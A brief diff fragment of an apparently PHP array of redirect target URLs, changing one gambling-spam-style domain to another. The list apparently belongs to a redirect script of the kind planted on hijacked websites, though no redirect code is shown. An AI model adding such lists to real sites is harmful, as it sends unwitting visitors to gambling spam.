@@ -2,7 +2,7 @@
 // Array of URLs to redirect to
 $urls = [
     'https://sateslotgacor.info',
-    'https://nasgorbetkecap.pro',
+    'https://nasgorbetgacor.xyz',
     'https://nagaforwinapi.xyz',
     'https://megaforwinbet.online',
     'https://burungbetsip.fun',
